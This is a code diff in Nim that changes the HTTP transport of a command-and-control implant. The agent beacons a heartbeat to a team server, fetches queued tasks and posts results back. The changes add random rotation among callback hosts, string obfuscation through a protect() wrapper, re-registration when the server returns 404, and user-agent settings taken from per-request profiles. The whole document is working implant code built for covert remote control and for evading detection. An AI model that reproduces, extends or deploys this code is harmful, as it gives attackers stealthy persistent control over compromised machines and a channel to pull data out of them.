@@ -1,17 +1,17 @@
-import httpclient, json, strformat, strutils, asyncdispatch, base64, tables, parsetoml, random
-
+import httpclient, strformat, strutils, asyncdispatch, base64, tables, parsetoml, random
+import ../utils/io
 import ../../common/[types, utils, profile]
 
 proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string = 
 
-    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("agent.user-agent")))
+    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-get.user-agent")))
     var heartbeatString: string
 
     # Apply data transformation to the heartbeat bytes
-    case ctx.profile.getString(protect("http-get.agent.heartbeat.encoding.type"), default = "none")
-    of "base64":
+    case ctx.profile.getString(protect("http-get.agent.heartbeat.encoding.type"), default = protect("none"))
+    of protect("base64"):
         heartbeatString = encode(heartbeat, safe = ctx.profile.getBool(protect("http-get.agent.heartbeat.encoding.url-safe"))).replace("=", "")
-    of "none": 
+    of protect("none"): 
         heartbeatString = Bytes.toString(heartbeat)
 
     # Define request headers, as defined in profile
@@ -30,14 +30,14 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
 
     # Add heartbeat packet to the request
     case ctx.profile.getString(protect("http-get.agent.heartbeat.placement.type")): 
-    of "header": 
+    of protect("header"): 
         client.headers.add(ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name")), payload)
-    of "parameter":
+    of protect("parameter"):
         let param = ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name"))
         endpoint &= fmt"{param}={payload}&"
-    of "uri":
+    of protect("uri"):
         discard
-    of "body": 
+    of protect("body"): 
         discard
     else:
         discard 
@@ -48,10 +48,18 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
 
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
-        let responseBody = waitFor client.getContent(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint[0..^2]}")
-    
+        # Select random callback host
+        let hosts = ctx.hosts.split(";")
+        let host = hosts[rand(hosts.len() - 1)]
+        let response = waitFor client.get(fmt"http://{host}/{endpoint[0..^2]}")
+
+        # Check the HTTP status code to determine whether the agent needs to re-register to the team server
+        if response.code == Http404: 
+            ctx.registered = false
+
         # Return if no tasks are queued
-        if responseBody.len <= 0: 
+        let responseBody = waitFor response.body
+        if responseBody.len() <= 0: 
             return ""
 
         # In case that tasks are found, apply data transformation to server's response body to get thr raw data
@@ -60,15 +68,15 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
             suffix = ctx.profile.getString(protect("http-get.server.output.suffix"))
             encResponse = responseBody[len(prefix) ..^ len(suffix) + 1]
 
-        case ctx.profile.getString(protect("http-get.server.output.encoding.type"), default = "none"): 
-        of "base64":
+        case ctx.profile.getString(protect("http-get.server.output.encoding.type"), default = protect("none")): 
+        of protect("base64"):
             return decode(encResponse) 
-        of "none":
+        of protect("none"):
             return encResponse 
 
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
-        echo "[-] " & err.msg 
+        print "[-] ", err.msg 
     
     finally:
         client.close()
@@ -77,7 +85,7 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
 
 proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
     
-    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("agent.user-agent")))
+    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-post.user-agent")))
 
     # Define request headers, as defined in profile
     for header, value in ctx.profile.getTable(protect("http-post.agent.headers")): 
@@ -94,10 +102,13 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
 
     try:
         # Send post request to team server
-        discard waitFor client.request(fmt"http://{ctx.ip}:{$ctx.port}/{endpoint}", requestMethod, body)
+        # Select random callback host
+        let hosts = ctx.hosts.split(";")
+        let host = hosts[rand(hosts.len() - 1)]
+        discard waitFor client.request(fmt"http://{host}/{endpoint}", requestMethod, body)
     
     except CatchableError as err:
-        echo "[-] " & err.msg 
+        print "[-] ", err.msg 
         return false
     
     finally:
